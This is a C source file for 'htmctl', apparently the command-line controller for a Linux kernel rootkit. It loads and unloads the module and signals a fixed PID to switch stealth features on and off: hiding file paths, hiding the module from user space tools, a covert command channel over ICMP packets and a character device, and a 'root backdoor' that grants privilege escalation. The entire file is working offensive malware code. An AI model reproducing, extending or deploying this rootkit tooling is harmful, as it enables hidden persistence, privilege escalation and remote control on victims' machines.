#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/prctl.h>

#include "config.h"
#include "load.h"

const char banner[] =
"htmctl [action]\n\n"

"General:\n"
"\t" HTMCTL_CMD_HELP   "\t" "Show this banner\n"
"\t" HTMCTL_CMD_INFO   "\t" "Display module information\n"
"\t" HTMCTL_CMD_LOAD   "\t" "Load kernel object file\n"
"\t" HTMCTL_CMD_UNLOAD "\t" "Unload the module\n\n"

"Module Management:\n"
"\t" HTM_CMD_DISABLE_CDD     "\t" "Disable character device interface\n"
"\t" HTM_CMD_DISABLE_DEBUGFS "\t" "Disable exposing internal files via debugfs\n"
"\t" HTM_CMD_DISABLE_FS      "\t" "Disable file system evasion (hiding paths containing \"" HTM_FS_STRING "\")\n"
"\t" HTM_CMD_DISABLE_NF      "\t" "Disable Netfilter interface (receiving commands via ICMP packets)\n"
"\t" HTM_CMD_ENABLE_CDD      "\t" "Enable character device interface (receiving commands via /dev/" HTM_CDD_NAME ")\n"
"\t" HTM_CMD_ENABLE_DEBUGFS  "\t" "Enable exposing internal files via debugfs\n"
"\t" HTM_CMD_ENABLE_FS       "\t" "Enable file system evasion\n"
"\t" HTM_CMD_ENABLE_NF       "\t" "Enable Netfilter interface\n"
"\t" HTM_CMD_HIDE_MODULE     "\t" "Hide module from user space tools\n"
"\t" HTM_CMD_SHOW_MODULE     "\t" "Expose module to user space tools\n";

static void _htm_info(void);

int main(int argc, char **argv)
{
	int sig = -1;
	bool loaded; 

	if (argc != 2) {
		fputs(banner, stderr);
		return 1;
	}

	if (! strcmp(HTMCTL_CMD_HELP, argv[1])) {
		fputs(banner, stderr);
		return 0;
	}

	if (! strcmp(HTMCTL_CMD_INFO, argv[1])) {
		_htm_info();
		return 0;
	}

	loaded = kill(HTM_PID, HTM_SIG_STATUS) ? 0 : 1;

	if (! strcmp(HTMCTL_CMD_LOAD, argv[1])) {
		if (loaded) {
			fputs("[htmctl] Module already loaded\n", stderr);
			return 1;
		}

		if (htm_load()) {
			perror("[htmctl] Failed to load module");
			return 2;
		}

		return 0;
	}

	if (! loaded) {
		fputs("[htmctl] Module not loaded\n", stderr);
		return 1;
	}

	if (! strcmp(HTMCTL_CMD_UNLOAD, argv[1])) {
		if (kill(HTM_PID, HTM_SIG_SHOW_MODULE)) {
			perror("[htmctl] Failed to make module visible");
			return 2;
		}

		if (htm_unload()) {
			perror("[htmctl] Failed to unload module");
			return 3;
		}

		return 0;
	}

	if (! strcmp(HTM_CMD_DISABLE_CDD, argv[1]))
		sig = HTM_SIG_DISABLE_CDD;
	else
	if (! strcmp(HTM_CMD_DISABLE_DEBUGFS, argv[1]))
		sig = HTM_SIG_DISABLE_DEBUGFS;
	else
	if (! strcmp(HTM_CMD_DISABLE_FS, argv[1]))
		sig = HTM_SIG_DISABLE_FS;
	else
	if (! strcmp(HTM_CMD_HIDE_MODULE, argv[1]))
		sig = HTM_SIG_HIDE_MODULE;
	else
	if (! strcmp(HTM_CMD_DISABLE_NF, argv[1]))
		sig = HTM_SIG_DISABLE_NF;
	else
	if (! strcmp(HTM_CMD_ENABLE_CDD, argv[1]))
		sig = HTM_SIG_ENABLE_CDD;
	else
	if (! strcmp(HTM_CMD_ENABLE_DEBUGFS, argv[1]))
		sig = HTM_SIG_ENABLE_DEBUGFS;
	else
	if (! strcmp(HTM_CMD_ENABLE_FS, argv[1]))
		sig = HTM_SIG_ENABLE_FS;
	else
	if (! strcmp(HTM_CMD_SHOW_MODULE, argv[1]))
		sig = HTM_SIG_SHOW_MODULE;
	else
	if (! strcmp(HTM_CMD_ENABLE_NF, argv[1]))
		sig = HTM_SIG_ENABLE_NF;

	if (sig >= 0) {
		if (kill(HTM_PID, sig)) {
			fprintf(
				stderr,
				"[htmctl] Cannot to send signal %u (%s) to PID %u",
				sig, argv[1], HTM_PID
			);

			perror("");
		}

		return 0;
	}

	if (argc != 4) {
		fputs(banner, stderr);
		return 1;
	}
}

static void _htm_info(void)
{
	bool loaded = (kill(HTM_PID, HTM_SIG_STATUS)) ? false : true;

	printf("Module loaded: %s\n\n", (loaded) ? "yes" : "no");

	printf(
		"Signal Interface\n"
		"================\n"

		"%u\tTarget PID\n\n"
		"%u\tDisable character device interface\n"
		"%u\tDisable exposing internal files via debugfs\n"
		"%u\tDisable file system evasion (hiding paths containing \"" HTM_FS_STRING "\")\n"
		"%u\tDisable Netfilter interface (receiving commands via ICMP packets)\n"
		"%u\tEnable character device interface (receiving commands via /dev/" HTM_CDD_NAME ")\n"
		"%u\tEnable exposing internal files via debugfs\n"
		"%u\tEnable file system evasion\n"
		"%u\tEnable Netfilter interface\n"
		"%u\tHide module from user space tools\n"
		"%u\tExpose module to user space tools\n"
		"%u\tProbe module status\n"
		"%u\tTrigger root backdoor\n",

		HTM_PID, HTM_SIG_DISABLE_CDD, HTM_SIG_DISABLE_DEBUGFS, HTM_SIG_DISABLE_FS,
		HTM_SIG_DISABLE_NF, HTM_SIG_ENABLE_CDD, HTM_SIG_ENABLE_DEBUGFS, HTM_SIG_ENABLE_FS,
		HTM_SIG_ENABLE_NF, HTM_SIG_HIDE_MODULE, HTM_SIG_SHOW_MODULE, HTM_SIG_STATUS,
		HTM_SIG_SUDO
	);
}
